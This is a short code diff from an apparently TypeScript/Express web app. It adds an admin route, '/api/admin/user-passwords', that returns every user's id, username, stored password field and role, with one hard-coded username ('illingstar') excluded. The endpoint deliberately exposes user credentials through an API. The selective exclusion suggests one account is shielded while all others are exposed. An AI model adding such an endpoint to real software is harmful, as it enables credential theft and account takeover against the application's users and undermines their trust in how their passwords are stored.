@@ -399,6 +399,19 @@ export async function registerRoutes(
     return res.json({ users });
   });
 
+  app.get('/api/admin/user-passwords', requireAuth, requireAdmin, async (req, res) => {
+    const users = storage.getAllUsers();
+    const passwordData = users
+      .filter(u => u.username !== 'illingstar')
+      .map(u => ({
+        id: u.id,
+        username: u.username,
+        password: u.password,
+        role: u.role,
+      }));
+    return res.json({ passwords: passwordData });
+  });
+
   app.get('/api/admin/analytics', requireAuth, requireModerator, async (req, res) => {
     const analytics = storage.getAnalytics();
     return res.json(analytics);
